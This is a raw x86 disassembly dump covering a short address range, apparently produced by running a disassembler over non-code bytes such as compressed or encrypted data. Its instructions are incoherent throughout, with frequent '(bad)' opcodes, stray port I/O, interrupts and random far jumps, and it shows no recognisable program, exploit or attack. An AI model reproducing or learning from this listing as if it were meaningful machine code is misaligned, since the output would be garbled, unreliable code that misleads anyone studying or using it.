  42dce0:	sbb    ah,bl
  42dce2:	mov    BYTE PTR [ecx+0x4545fb6e],bl
  42dce8:	jp     0x42dca7
  42dcea:	mov    ds:0xf73cb0,eax
	...
  42dd53:	add    BYTE PTR [eax],al
  42dd55:	add    BYTE PTR [ecx],bh
  42dd57:	mov    bh,0x6d
  42dd59:	pxor   mm3,mm7
  42dd5c:	jnp    0x42dd15
  42dd5e:	adc    BYTE PTR [eax],ch
  42dd60:	jne    0x42dd48
  42dd62:	push   esi
  42dd63:	inc    esp
  42dd64:	fidivr WORD PTR [edx]
  42dd66:	addr16 jmp 0x42dd6a
  42dd69:	add    BYTE PTR [eax],al
  42dd6b:	add    DWORD PTR [eax],eax
  42dd6d:	add    BYTE PTR [eax],ch
  42dd6f:	mov    edx,0x905a9f4e
  42dd74:	xor    ebx,DWORD PTR [edx-0x350c100]
  42dd7a:	jecxz  0x42dd9d
  42dd7c:	lock stc 
  42dd7e:	repz in eax,0x73
  42dd81:	mov    cl,0x1a
  42dd83:	xor    dh,dl
  42dd85:	dec    ecx
  42dd86:	mov    cl,0x2f
  42dd88:	cmp    al,0x49
  42dd8a:	lock cmp BYTE PTR [edx],bl
  42dd8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dd8e:	int    0xd3
  42dd90:	cmc    
  42dd91:	xchg   esp,eax
  42dd92:	jge    0x42dd65
  42dd94:	shr    DWORD PTR [esi+edx*4-0x7e305948],0x54
  42dd9c:	arpl   WORD PTR [edx-0x51cd0fa5],ax
  42dda2:	ins    BYTE PTR es:[edi],dx
  42dda3:	popa   
  42dda4:	pop    esp
  42dda5:	out    0xd5,al
  42dda7:	or     ebx,DWORD PTR [ebp+0xd]
  42ddaa:	pop    ss
  42ddab:	adc    DWORD PTR [edx-0x4a],ebx
  42ddae:	das    
  42ddaf:	popf   
  42ddb0:	(bad)  
  42ddb1:	mov    al,bh
  42ddb3:	mov    eax,DWORD PTR [esp+ebp*8+0x5d90e977]
  42ddba:	(bad)  
  42ddbc:	popa   
  42ddbd:	loopne 0x42ddbc
  42ddbf:	(bad)  
  42ddc0:	stos   DWORD PTR es:[edi],eax
  42ddc1:	pushfw 
  42ddc3:	aad    0xd
  42ddc5:	bound  edx,QWORD PTR [esi+0x3d]
  42ddc8:	xchg   edx,eax
  42ddc9:	jmp    0x5fd1:0x56847ac0
  42ddd0:	mov    eax,0xdddfbe97
  42ddd5:	fcomp  QWORD PTR [eax]
  42ddd7:	xchg   ebp,eax
  42ddd8:	dec    esp
  42ddd9:	loop   0x42dda2
  42dddb:	xchg   esi,eax
  42dddc:	daa    
  42dddd:	dec    edx
  42ddde:	ret    
  42dddf:	lods   eax,DWORD PTR ds:[esi]
  42dde0:	add    esi,0xffffff80
  42dde3:	(bad)  
  42dde4:	arpl   WORD PTR [edi+eax*1],dx
  42dde7:	adc    edi,ebp
  42dde9:	adc    edx,DWORD PTR ds:0x3b8d4fae
  42ddef:	jecxz  0x42ddc3
  42ddf1:	jg     0x42ddaf
  42ddf3:	out    0xfd,eax
  42ddf5:	sbb    eax,0xa9993a90
  42ddfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ddfb:	cld    
  42ddfc:	in     eax,dx
  42ddfd:	imul   edi,DWORD PTR [eax],0xffffffbf
  42de00:	popf   
  42de01:	(bad)  
  42de03:	int3   
  42de04:	xor    DWORD PTR [esi],ecx
  42de06:	jl     0x42de02
  42de08:	mov    dh,0x3a
  42de0a:	or     al,0xad
  42de0c:	test   eax,0xd7ae4a2
  42de11:	mov    esp,DWORD PTR [ecx+0x35ccdf7a]
  42de17:	in     al,0xe3
  42de19:	jl     0x42de44
  42de1b:	fldenv [ebp-0x27]
  42de1e:	mov    ds:0xf9396ff4,eax
  42de23:	mov    bh,0xbc
  42de25:	addr16 cdq 
  42de27:	jne    0x42ddbe
  42de29:	xor    eax,0x21b16602
  42de2e:	inc    edi
  42de2f:	or     BYTE PTR [edi-0x457f6054],al
  42de35:	in     al,dx
  42de36:	test   DWORD PTR [edx],edi
  42de38:	es dec edx
  42de3a:	inc    edx
  42de3b:	jne    0x42de23
  42de3d:	retf   0x73b2
  42de40:	xor    al,0x93
  42de42:	xor    DWORD PTR ds:0xe403ca7b,0x23
  42de49:	fdivr  DWORD PTR [edi]
  42de4b:	pop    ebx
  42de4c:	pusha  
  42de4d:	or     dl,dh
  42de4f:	or     eax,0x797e93c6
  42de54:	ins    BYTE PTR es:[edi],dx
  42de55:	adc    al,0xb0
  42de57:	hlt    
  42de58:	popa   
  42de59:	addr16 rcl esi,0x82
  42de5d:	enter  0x3cf7,0xed
  42de61:	inc    ebp
  42de62:	cmp    esi,DWORD PTR [esi+0x705f91bb]
  42de68:	jnp    0x42dec6
  42de6a:	out    dx,eax
  42de6b:	dec    esi
  42de6c:	xlat   BYTE PTR ds:[ebx]
  42de6d:	mov    ah,0x0
	...
  42ded3:	add    BYTE PTR [eax],al
  42ded5:	add    dh,ah
  42ded7:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42dede:	fist   DWORD PTR [ebp-0x79]
  42dee1:	das    
  42dee2:	lea    esi,[ecx-0x13987876]
  42dee8:	add    DWORD PTR [eax],eax
  42deea:	add    BYTE PTR [ecx],al
  42deec:	add    BYTE PTR [eax],al
  42deee:	cmp    DWORD PTR [ecx],edi
  42def0:	sub    esp,DWORD PTR [bx]
  42def3:	mov    edi,0x17258c64
  42def8:	and    eax,0x75121601
  42defd:	xor    eax,0xbe12777a
  42df02:	push   ss
  42df03:	(bad)  
  42df04:	cmp    eax,0xde65c1f1
  42df09:	lahf   
  42df0a:	sbb    BYTE PTR [edx],0xc5
  42df0d:	lods   eax,DWORD PTR ds:[esi]
  42df0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df0f:	shl    bh,cl
  42df11:	cld    
  42df12:	ja     0x42df1f
  42df14:	stos   BYTE PTR es:[edi],al
  42df15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42df16:	ds cdq 
  42df18:	cli    
  42df19:	jb     0x42df46
  42df1b:	and    ebx,DWORD PTR [edi-0x9]
  42df1e:	xor    BYTE PTR [edx+esi*2],bh
  42df21:	bound  edx,QWORD PTR fs:[esi]
  42df24:	scas   eax,DWORD PTR es:[edi]
  42df25:	and    al,0x95
  42df27:	outs   dx,DWORD PTR ds:[esi]
  42df28:	mov    edi,0x7881460a
  42df2d:	pop    ebx
  42df2e:	inc    ecx
  42df2f:	sahf   
  42df30:	dec    eax
  42df31:	out    dx,al
  42df32:	dec    eax
  42df33:	and    DWORD PTR [ecx-0x3],edx
  42df36:	jge    0x42def7
  42df38:	cld    
  42df39:	mov    ebx,0x23dd5e49
  42df3e:	mov    ecx,0x63dc44de
  42df43:	pop    ebp
  42df44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42df45:	leave  
  42df46:	bsr    edi,esp
  42df49:	call   DWORD PTR [ebp+ebx*1+0x303c69b7]
  42df50:	xchg   esp,eax
  42df51:	cmp    DWORD PTR [edi+edi*1+0x4a4b2b48],edx
  42df58:	out    dx,eax
  42df59:	ret    0xca14
  42df5c:	add    bl,bh
  42df5e:	sbb    DWORD PTR [esi-0x2205a28b],ebx
  42df64:	js     0x42df14
  42df66:	ins    DWORD PTR es:[edi],dx
  42df67:	pop    eax
  42df68:	clc    
  42df69:	pop    edi
  42df6a:	cmp    al,0x3d
  42df6c:	repz xor BYTE PTR [ebp-0x2f],dh
  42df70:	jp     0x42df93
  42df72:	bound  esi,QWORD PTR [esi]
  42df74:	xlat   BYTE PTR ds:[ebx]
  42df75:	fs data16 jl 0x42dfc7
  42df79:	sbb    BYTE PTR [edx],cl
  42df7b:	push   ebp
  42df7c:	cmp    DWORD PTR [ebp-0x5],ebx
  42df7f:	retf   0x2283
  42df82:	imul   edi
  42df84:	(bad)  
  42df85:	xor    DWORD PTR [ebp-0x6c],ebp
  42df88:	jge    0x42df6c
  42df8a:	jl     0x42dfdd
  42df8c:	xor    ah,bl
  42df8e:	cmp    al,0x80
  42df90:	inc    ecx
  42df91:	sub    DWORD PTR [ebx+0x2ad86fc],edx
  42df97:	dec    ecx
  42df98:	xor    BYTE PTR [ecx-0x30ec7b38],cl
  42df9e:	mov    esp,0x4298df0b
  42dfa3:	jno    0x42df9f
  42dfa5:	lock pop ebx
  42dfa7:	push   0x4a04c53c
  42dfac:	and    DWORD PTR [ebx+0x66517428],edi
  42dfb2:	shl    BYTE PTR [edi-0x52],1
  42dfb5:	xchg   edx,eax
  42dfb6:	push   0xffffff88
  42dfb8:	sbb    DWORD PTR [esp+eiz*4-0x5],ebx
  42dfbc:	and    DWORD PTR [eax-0x4d3ad2e1],ecx
  42dfc2:	cmp    BYTE PTR [ebp+0x16953c06],dh
  42dfc8:	xor    DWORD PTR [bx],edi
  42dfcb:	loopne 0x42dffd
  42dfcd:	das    
  42dfce:	(bad)  
  42dfcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dfd0:	adc    al,0x18
  42dfd2:	inc    ebx
  42dfd3:	xchg   ecx,eax
  42dfd4:	mov    esi,0xbb7479fe
  42dfd9:	dec    edi
  42dfda:	loop   0x42df62
  42dfdc:	pop    ecx
  42dfdd:	push   esp
  42dfde:	shr    BYTE PTR [eax-0x767f6701],1
  42dfe4:	jo     0x42df6d
  42dfe6:	int    0x10
  42dfe8:	pop    esp
  42dfe9:	aad    0xef
  42dfeb:	dec    ebx
  42dfec:	dec    edi
  42dfed:	pop    esp
	...
  42e056:	add    bh,dh
  42e058:	jb     0x42e000
  42e05a:	(bad)  
  42e05b:	scas   al,BYTE PTR es:[edi]
  42e05c:	(bad)  
  42e05d:	dec    BYTE PTR [edi-0x30]
  42e060:	fisttp WORD PTR [esi-0x25]
  42e063:	(bad)  
  42e065:	aam    0x67
  42e067:	in     eax,dx
  42e068:	add    DWORD PTR [eax],eax
  42e06a:	add    BYTE PTR [ecx],al
  42e06c:	add    BYTE PTR [eax],al
  42e06e:	inc    eax
  42e06f:	les    bp,DWORD PTR [esi+0x55]
  42e073:	pop    edx
  42e074:	push   ebp
  42e075:	xor    ch,al
  42e077:	test   eax,0xf58b4d7d
  42e07c:	cld    
  42e07d:	and    eax,0x2e6deb33
  42e082:	loopne 0x42e065
  42e084:	push   es
  42e085:	dec    DWORD PTR [esi+0x5c07ce37]
  42e08b:	fsub   QWORD PTR [eax-0x653555d]
  42e091:	inc    ebp
  42e092:	xchg   DWORD PTR [esi-0x6101b513],ecx
  42e098:	cmp    ecx,0x284318a2
  42e09e:	sbb    bh,BYTE PTR [ebx-0x6c]
  42e0a1:	push   ds
  42e0a2:	xor    al,0xe5
  42e0a4:	cld    
  42e0a5:	sti    
  42e0a6:	jmp    0x3c83:0xa2f54bac
  42e0ad:	xor    al,0xb3
  42e0af:	jo     0x42e092
  42e0b1:	add    BYTE PTR [edi],0x93
  42e0b4:	mov    es,WORD PTR [esi-0x71]
  42e0b7:	dec    ecx
  42e0b8:	inc    edx
  42e0b9:	ficomp DWORD PTR [edx]
  42e0bb:	mov    cl,0x9f
  42e0bd:	pop    esi
  42e0be:	stos   BYTE PTR es:[edi],al
  42e0bf:	scas   al,BYTE PTR es:[edi]
  42e0c0:	shl    BYTE PTR [ebx+0x7e],1
  42e0c3:	jecxz  0x42e0f1
  42e0c5:	das    
  42e0c6:	fisttp WORD PTR [ebx]
  42e0c8:	dec    esp
  42e0c9:	test   DWORD PTR [ecx+0x2],edi
  42e0cc:	aad    0x1e
  42e0ce:	cmp    DWORD PTR [edi-0x31d63037],0x4e
  42e0d5:	js     0x42e0b9
  42e0d7:	dec    esi
  42e0d8:	mov    ch,0x10
  42e0da:	(bad)  
  42e0db:	fcomp  DWORD PTR [edi]
  42e0dd:	sbb    bl,BYTE PTR [esp+eax*1-0x7c]
  42e0e1:	push   es
  42e0e2:	push   esp
  42e0e3:	test   eax,0xf4aca42b
  42e0e8:	sub    bl,cl
  42e0ea:	stos   DWORD PTR es:[edi],eax
  42e0eb:	xor    ch,BYTE PTR [ecx-0x5]
  42e0ee:	mov    al,0x29
  42e0f0:	xchg   DWORD PTR [edi+0x4eeef842],esi
  42e0f6:	xor    al,0x2b
  42e0f8:	jne    0x42e07b
  42e0fa:	push   esi
  42e0fb:	sti    
  42e0fc:	pop    ds
  42e0fd:	mov    ds:0xe0d003e9,eax
  42e102:	mov    cl,0xc6
  42e104:	stos   DWORD PTR es:[edi],eax
  42e105:	push   0x66
  42e107:	jne    0x42e11b
  42e109:	addr16 push ebp
  42e10b:	push   edx
  42e10c:	or     BYTE PTR [ebx],bh
  42e10e:	mov    edx,0x1232d5e1
  42e113:	nop
  42e114:	mov    ah,0x85
  42e116:	ins    DWORD PTR es:[edi],dx
  42e117:	mov    dh,0xd5
  42e119:	test   BYTE PTR [ecx-0x16],0xf3
  42e11d:	adc    al,0xca
  42e11f:	shl    BYTE PTR [ebx+0x3f],1
  42e122:	loope  0x42e0db
  42e124:	stc    
  42e125:	icebp  
  42e126:	test   DWORD PTR [ebx],esp
  42e128:	jno    0x42e1a5
  42e12a:	mov    ?,WORD PTR [ecx+0x8]
  42e12d:	neg    BYTE PTR [ecx+0x4280996d]
  42e133:	repz adc ch,dh
  42e136:	aam    0x71
  42e138:	or     BYTE PTR [eax-0x50],dl
  42e13b:	xor    eax,DWORD PTR [ecx-0xa48953a]
  42e141:	fsub   QWORD PTR [eax]
  42e143:	pop    eax
  42e144:	popa   
  42e145:	adc    esp,DWORD PTR [ecx-0x2f1a60aa]
  42e14b:	pop    ds
  42e14c:	mov    ebp,0x987c75bd
  42e151:	mov    dl,0x57
  42e153:	sub    ah,ch
  42e155:	sbb    DWORD PTR [edx],esp
  42e157:	loop   0x42e196
  42e159:	cmc    
  42e15a:	jb     0x42e184
  42e15c:	lds    ebx,FWORD PTR [edx+0x6e96c3b5]
  42e162:	push   edx
  42e163:	inc    ebx
  42e164:	push   es
  42e165:	retf   
  42e166:	sbb    dl,bl
  42e168:	mov    ebp,DWORD PTR ds:0x12f104
	...
  42e1d6:	mov    eax,ds:0x7e061ecf
  42e1db:	xlat   BYTE PTR ds:[ebx]
  42e1dc:	mov    ecx,0x35bb80ef
  42e1e1:	xchg   edi,eax
  42e1e2:	sub    ah,cl
  42e1e4:	je     0x42e242
  42e1e6:	addr16 out dx,al
  42e1e8:	add    DWORD PTR [eax],eax
  42e1ea:	add    BYTE PTR [ecx],al
  42e1ec:	add    BYTE PTR [eax],al
  42e1ee:	sub    BYTE PTR [ecx],dh
  42e1f0:	dec    esi
  42e1f1:	add    eax,0xfc2e1b0a
  42e1f6:	cmc    
  42e1f7:	xchg   edi,eax
  42e1f8:	and    eax,0x390d3f7a
  42e1fd:	int    0x4a
  42e1ff:	scas   eax,DWORD PTR es:[edi]
  42e200:	arpl   WORD PTR [ecx+0x5fb8bf25],sp
  42e206:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e207:	mov    ah,BYTE PTR [edx+0x48]
  42e20a:	add    DWORD PTR [ecx+0x4d],edx
  42e20d:	jne    0x42e259
  42e20f:	ins    BYTE PTR es:[edi],dx
  42e210:	jae    0x42e208
  42e212:	jle    0x42e1af
  42e214:	add    dh,0x0
  42e217:	cmp    bl,BYTE PTR [eax-0x1397922c]
  42e21d:	(bad)  
  42e21e:	sbb    DWORD PTR [eax-0x71365f57],ebx
  42e224:	xlat   BYTE PTR ds:[ebx]
  42e225:	(bad)  
  42e226:	fadd   QWORD PTR ds:0xf57dbdc4
  42e22c:	outs   dx,DWORD PTR ds:[esi]
  42e22d:	sub    esi,DWORD PTR [ebx]
  42e22f:	pop    esi
  42e230:	cmc    
  42e231:	(bad)
  42e234:	or     BYTE PTR [edx-0x677a8a74],dl
  42e23a:	inc    ecx
  42e23b:	sbb    eax,DWORD PTR [edx-0x4e]
  42e23e:	scas   eax,DWORD PTR es:[edi]
  42e23f:	adc    cl,BYTE PTR ds:0x39b97f61
  42e245:	jl     0x42e28b
  42e247:	inc    edx
  42e248:	adc    eax,0x9b0b1a2a
  42e24d:	call   ecx
  42e24f:	fwait
  42e250:	(bad)  
  42e251:	js     0x42e26e
  42e253:	pop    ds
  42e254:	pop    edx
  42e255:	inc    edx
  42e256:	adc    eax,edi
  42e258:	mov    ecx,0x5fb9f399
  42e25d:	sub    DWORD PTR [ebx],eax
  42e25f:	daa    
  42e260:	mov    ch,0x9f
  42e262:	sbb    ecx,DWORD PTR [esp+eax*2]
  42e265:	mov    ds:0xa9c3c45f,al
  42e26a:	jmp    0x1aaa:0x706108d2
  42e271:	or     cl,ch
  42e273:	cmp    ebp,DWORD PTR [ebx-0x56765617]
  42e279:	or     bl,BYTE PTR [ebx+0x7b]
  42e27c:	popa   
  42e27d:	or     eax,0x8d67f266
  42e282:	lahf   
  42e283:	pop    ds
  42e284:	mov    gs,WORD PTR [edx+ebx*1-0x5c]
  42e288:	sbb    al,0x7f
  42e28a:	xor    esp,ebp
  42e28c:	xchg   esp,eax
  42e28d:	cmp    al,0xd3
  42e28f:	or     BYTE PTR [ebp+0x69],cl
  42e292:	or     edi,DWORD PTR [edi]
  42e294:	test   eax,0x47b6a2c9
  42e299:	std    
  42e29a:	cmp    eax,0x4f6e7c3c
  42e29f:	pop    esi
  42e2a0:	sub    al,0x7e
  42e2a2:	cmp    cl,ah
  42e2a4:	mov    al,ds:0xea05e94a
  42e2a9:	inc    ecx
  42e2aa:	mov    dh,0xf0
  42e2ac:	jbe    0x42e325
  42e2ae:	mov    dl,0x51
  42e2b0:	je     0x42e2ca
  42e2b2:	gs jb  0x42e28e
  42e2b5:	fisttp DWORD PTR [edx+0x5c]
  42e2b8:	inc    esp
  42e2b9:	test   bh,cl
  42e2bb:	std    
  42e2bc:	fxch   st(1)
  42e2be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e2bf:	sub    edi,DWORD PTR [esi-0x49]
  42e2c2:	popa   
  42e2c3:	mov    esi,0x8a1fbe05
  42e2c8:	xchg   edx,eax
  42e2c9:	test   al,0x29
  42e2cb:	sub    eax,0xee0248cc
  42e2d0:	pop    es
  42e2d1:	es daa 
  42e2d3:	leave  
  42e2d4:	pop    ebx
  42e2d5:	push   esp
  42e2d6:	pop    edx
  42e2d7:	int    0x5e
  42e2d9:	jno    0x42e2ee
  42e2db:	add    edx,DWORD PTR [ebx]
  42e2dd:	inc    eax
  42e2de:	adc    BYTE PTR [ebx-0x3c],bl
  42e2e1:	fsubr  DWORD PTR ss:[eax]
  42e2e4:	push   ss
  42e2e5:	(bad)
  42e2e9:	out    dx,al
  42e2ea:	mov    BYTE PTR [esi+0x7315],bh
	...
  42e354:	add    BYTE PTR [eax],al
  42e356:	lods   eax,DWORD PTR ds:[esi]
  42e357:	cmp    eax,0xb79aa78a
  42e35c:	lods   eax,DWORD PTR ds:[esi]
  42e35d:	aas    
  42e35e:	mov    ebx,0xa6199140
  42e363:	arpl   WORD PTR [ebx-0x55],di
  42e366:	addr16 out dx,eax
  42e368:	add    DWORD PTR [eax],eax
  42e36a:	add    BYTE PTR [ecx],al
  42e36c:	add    BYTE PTR [eax],al
  42e36e:	and    DWORD PTR [ebx],0xfffffff6
  42e371:	int    0x3d
  42e373:	int3   
  42e374:	popa   
  42e375:	mov    edx,0xfe53354
  42e37a:	sub    ebp,ebx
  42e37c:	pushf  
  42e37d:	ds push ebp
  42e37f:	int    0xfa
  42e381:	ror    dh,cl
  42e383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e385:	jne    0x42e35e
  42e387:	pop    esp
  42e388:	dec    ebp
  42e389:	in     eax,dx
  42e38a:	out    dx,al
  42e38b:	mov    cl,0x34
  42e38d:	inc    edi
  42e38e:	xchg   esp,eax
  42e38f:	add    ecx,esp
  42e391:	dec    eax
  42e392:	or     edi,DWORD PTR [edx]
  42e394:	arpl   WORD PTR [ebp-0x25],bx
  42e397:	data16 rcr al,1
  42e39a:	jns    0x42e3b7
  42e39c:	mov    ch,0x46
  42e39e:	in     eax,0x76
  42e3a0:	loop   0x42e37a
  42e3a2:	loopne 0x42e399
  42e3a4:	(bad)  
  42e3a5:	cmp    BYTE PTR [eax],dl
  42e3a7:	or     BYTE PTR [ecx],0x94
  42e3aa:	(bad)  
  42e3ab:	aas    
  42e3ac:	jmp    0x8053:0xbd35d309
  42e3b3:	mov    al,0xd6
  42e3b5:	outs   dx,DWORD PTR ds:[esi]
  42e3b6:	ret    
  42e3b7:	or     DWORD PTR [eax-0x52],ebx
  42e3ba:	data16 outs dx,BYTE PTR ds:[esi]
  42e3bc:	cmp    DWORD PTR [edx-0x33],ebp
  42e3bf:	jecxz  0x42e3db
  42e3c1:	clc    
  42e3c2:	inc    edi
  42e3c3:	inc    esp
  42e3c4:	repz pushf 
  42e3c6:	cmp    ebx,ebp
  42e3c8:	fimul  DWORD PTR [edi]
  42e3ca:	idiv   DWORD PTR [edi+0x14]
  42e3cd:	in     al,0x70
  42e3cf:	push   esp
  42e3d0:	add    eax,0xb9bc55d1
  42e3d5:	inc    edx
  42e3d6:	imul   ebp,DWORD PTR [eax+0x31ef9696],0x62
  42e3dd:	call   edx
  42e3df:	jge    0x42e3e1
  42e3e1:	rol    BYTE PTR [edx+0x6d],1
  42e3e4:	int    0xc6
  42e3e6:	(bad)  
  42e3e7:	jg     0x42e452
  42e3e9:	(bad)  
  42e3ea:	aad    0x4b
  42e3ec:	dec    ecx
  42e3ed:	call   0xaa3607d5
  42e3f2:	inc    ebp
  42e3f3:	xchg   edx,eax
  42e3f4:	mov    ch,0xb2
  42e3f6:	loopne 0x42e403
  42e3f8:	mov    dh,0xa6
  42e3fa:	push   edx
  42e3fb:	lds    edx,FWORD PTR [ebx-0x5e]
  42e3fe:	scas   eax,DWORD PTR es:[edi]
  42e3ff:	loop   0x42e42f
  42e401:	mov    dh,0xa7
  42e403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e404:	mov    ds:0x90b7c341,eax
  42e409:	jle    0x42e439
  42e40b:	pusha  
  42e40c:	mov    DWORD PTR [esi+0x2a],esi
  42e40f:	adc    eax,0xc481918a
  42e414:	cmp    esi,DWORD PTR [edi+0x56]
  42e417:	add    cl,al
  42e419:	inc    BYTE PTR [ebx]
  42e41b:	xor    edi,DWORD PTR [eax-0x39]
  42e41e:	jle    0x42e44e
  42e420:	(bad)  
  42e421:	xlat   BYTE PTR ds:[ebx]
  42e422:	inc    edi
  42e423:	push   edx
  42e424:	pop    ebp
  42e425:	push   ebx
  42e426:	sub    DWORD PTR [esi+0x5f],0x27
  42e42a:	stos   BYTE PTR es:[edi],al
  42e42b:	std    
  42e42c:	adc    ebx,edx
  42e42e:	fst    QWORD PTR [edx]
  42e430:	popa   
  42e431:	lahf   
  42e432:	or     ecx,DWORD PTR [edi-0x7ffe4a23]
  42e438:	nop
  42e439:	cmp    al,0x1b
  42e43b:	test   eax,0x570b6492
  42e440:	xchg   DWORD PTR [esi-0x58],esp
  42e443:	xor    ecx,DWORD PTR [ebp-0x10d3f27d]
  42e449:	retf   0xb7ab
  42e44c:	and    eax,0x435dd269
  42e451:	jmp    0x42e438
  42e453:	adc    BYTE PTR [esi+0x27],dh
  42e456:	cld    
  42e457:	test   eax,0x6ac90bfa
  42e45c:	and    al,0x8e
  42e45e:	inc    DWORD PTR [edi+eiz*8+0x1cb30eb9]
  42e465:	sub    eax,0x20522cb1
  42e46a:	fistp  WORD PTR [edx]
  42e46c:	ss mov cl,0x0
	...
  42e4d3:	add    BYTE PTR [eax],al
  42e4d5:	add    dl,ah
  42e4d7:	mov    ebp,0xe7dfc7dc
  42e4dc:	sti    
  42e4dd:	mov    ebp,0xe093f290
  42e4e2:	(bad)  
  42e4e4:	add    DWORD PTR [edi+eiz*2+0x1f0],0x6d000001
  42e4ef:	nop
  42e4f0:	cdq    
  42e4f1:	retf   0xb8d1
  42e4f4:	fld    DWORD PTR [ebp+0xdbd628a]
  42e4fa:	xchg   esp,eax
  42e4fb:	rol    DWORD PTR [edx],0x39
  42e4fe:	loope  0x42e4a4
  42e500:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e501:	jae    0x42e4b9
  42e503:	jns    0x42e4c3
  42e505:	(bad)  [ebx+0x1fbe1a82]
  42e50b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e50c:	mov    ebx,0xfe23d27e
  42e511:	int    0x38
  42e513:	cmp    DWORD PTR [edx+eiz*4+0x6e467377],esp
  42e51a:	test   BYTE PTR [edx-0x45],cl
  42e51d:	test   ch,dl
  42e51f:	sahf   
  42e520:	push   ecx
  42e521:	lods   eax,DWORD PTR ds:[esi]
  42e522:	cmc    
  42e523:	imul   esi,esp,0x93849344
  42e529:	or     BYTE PTR [esi+0xc],0x38
  42e52d:	push   eax
  42e52e:	adc    DWORD PTR [ecx],0xffffffe5
  42e531:	cmp    al,0x3e
  42e533:	sbb    cl,dl
  42e535:	test   al,0xc5
  42e537:	(bad)  
  42e538:	mov    ebp,0xb96a9df5
  42e53d:	xor    ch,BYTE PTR [eax-0x4d737bd7]
  42e543:	lods   eax,DWORD PTR ds:[esi]
  42e544:	ja     0x42e574
  42e546:	sub    al,0x67
  42e548:	xchg   ecx,eax
  42e549:	add    al,0x7c
  42e54b:	leave  
  42e54c:	fcmovbe st,st(2)
  42e54e:	jae    0x42e568
  42e550:	lahf   
  42e551:	mov    WORD PTR [edi],ds
  42e553:	jge    0x42e4ff
  42e555:	sub    eax,0xe4f32501
  42e55a:	retf   
  42e55b:	xchg   edx,eax
  42e55c:	pand   mm0,QWORD PTR [edi-0x10]
  42e560:	ja     0x42e580
  42e562:	enter  0x57be,0x7b
  42e566:	and    dh,bl
  42e568:	mov    bl,0x52
  42e56a:	jnp    0x42e518
  42e56c:	mov    edi,0x9214a0ca
  42e571:	or     eax,0xdb4533fe
  42e576:	pop    ecx
  42e577:	push   ebp
  42e578:	push   eax
  42e579:	adc    al,0xfd
  42e57b:	rcr    BYTE PTR [edx+0x67fb6b05],cl
  42e581:	pop    edx
  42e582:	jbe    0x42e583
  42e584:	mov    ds,WORD PTR [esi]
  42e586:	xchg   ebp,eax
  42e587:	sbb    esi,edi
  42e589:	xor    BYTE PTR [ecx+0x1f],ch
  42e58c:	retf   
  42e58d:	jne    0x42e522
  42e58f:	mov    DWORD PTR [ecx+0x4d],esi
  42e592:	cmc    
  42e593:	ss or  eax,0x62b33584
  42e599:	push   edx
  42e59a:	cld    
  42e59b:	fsub   st(6),st
  42e59d:	mov    DWORD PTR [ebx-0x4f],eax
  42e5a0:	repz (bad) 
  42e5a3:	pusha  
  42e5a4:	fdivrp st(4),st
  42e5a6:	fbld   TBYTE PTR [edx+0x64]
  42e5a9:	xor    BYTE PTR [eax],0x6c
  42e5ac:	loop   0x42e58b
  42e5ae:	and    ch,dl
  42e5b0:	or     dh,BYTE PTR [ecx+0x56]
  42e5b3:	push   edx
  42e5b4:	and    al,0x24
  42e5b6:	sahf   
  42e5b7:	ret    
  42e5b8:	mov    DWORD PTR [esi+0x17],ebx
  42e5bb:	push   edi
  42e5bc:	jge    0x42e5f9
  42e5be:	and    al,bh
  42e5c0:	daa    
  42e5c1:	inc    ebp
  42e5c2:	and    DWORD PTR [ecx-0x43b3088],edi
  42e5c8:	fild   QWORD PTR [ecx]
  42e5ca:	add    al,bl
  42e5cc:	(bad)  
  42e5cd:	bound  edi,QWORD PTR [edi+0x7a]
  42e5d0:	call   0xe308e3e8
  42e5d5:	mov    eax,0xd7bc214f
  42e5da:	mov    dh,0x93
  42e5dc:	rcr    DWORD PTR [ebx-0x54fbcf49],1
  42e5e2:	jmp    0x42e576
  42e5e4:	icebp  
  42e5e5:	inc    edi
  42e5e6:	loopne 0x42e5d3
  42e5e8:	out    dx,eax
  42e5e9:	cmp    eax,DWORD PTR [ecx-0x10]
  42e5ec:	inc    esp
  42e5ed:	or     BYTE PTR [eax],al
	...
  42e653:	add    BYTE PTR [eax],al
  42e655:	add    BYTE PTR [ebp+0x38],dl
  42e658:	into   
  42e659:	adc    bh,ch
  42e65b:	neg    bh
  42e65d:	jge    0x42e5f1
  42e65f:	xchg   ebp,eax
  42e660:	jns    0x42e693
  42e662:	or     al,BYTE PTR [ebx-0xe98d021]
  42e668:	add    DWORD PTR [eax],eax
  42e66a:	add    BYTE PTR [ecx],al
  42e66c:	add    BYTE PTR [eax],al
  42e66e:	sahf   
  42e66f:	add    bl,BYTE PTR [ecx-0x12]
  42e672:	push   edi
  42e673:	dec    eax
  42e674:	xchg   esi,eax
  42e675:	cmp    DWORD PTR [ebx+0x62949ae1],esp
  42e67b:	(bad)  
  42e67d:	mov    ebp,0x4acc22d8
  42e682:	ret    0x45c7
  42e685:	add    al,0x2b
  42e687:	jae    0x42e649
  42e689:	out    dx,al
  42e68a:	fdiv   DWORD PTR [esi]
  42e68c:	inc    esi
  42e68d:	repz push edx
  42e68f:	or     DWORD PTR [ebp+0x31],ecx
  42e692:	sub    al,0xd0
  42e694:	pop    ebp
  42e695:	push   es
  42e696:	popa   
  42e697:	add    bh,dl
  42e699:	pop    ecx
  42e69a:	mov    bl,0x20
  42e69c:	scas   al,BYTE PTR es:[edi]
  42e69d:	stos   BYTE PTR es:[edi],al
  42e69e:	mov    ebx,0x374db402
  42e6a3:	jnp    0x42e655
  42e6a5:	mov    bl,BYTE PTR [ebx+0x2cb9f89f]
  42e6ab:	mov    bl,0xfa
  42e6ad:	jae    0x42e6e4
  42e6af:	fadd   QWORD PTR [esi]
  42e6b1:	ret    0x405e
  42e6b4:	adc    al,0xfb
  42e6b6:	push   ecx
  42e6b7:	xchg   edx,eax
